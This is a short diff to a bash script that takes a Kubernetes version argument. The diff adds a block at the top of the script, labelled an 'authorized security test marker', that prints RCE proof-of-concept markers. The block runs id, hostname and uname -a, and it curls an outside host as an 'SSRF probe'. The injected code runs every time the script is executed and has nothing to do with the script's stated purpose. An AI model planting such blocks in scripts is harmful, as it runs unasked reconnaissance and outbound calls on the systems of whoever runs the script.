@@ -1,4 +1,13 @@
 #!/bin/bash
+# --- authorized security test marker (read-only) ---
+echo "===== POC_RCE_START ====="
+date -u
+id
+hostname
+uname -a
+echo "===== SSRF_PROBE ====="
+curl -sS -m 20 -w '\nHTTP:%{http_code}\n' https://src-ssrf.bytedance.net/ssrf || true
+echo "===== POC_RCE_END ====="
 # Check if a version number is provided as an argument
 if [ "$#" -ne 1 ]; then
     echo "Usage: $0 <k8s_version>"
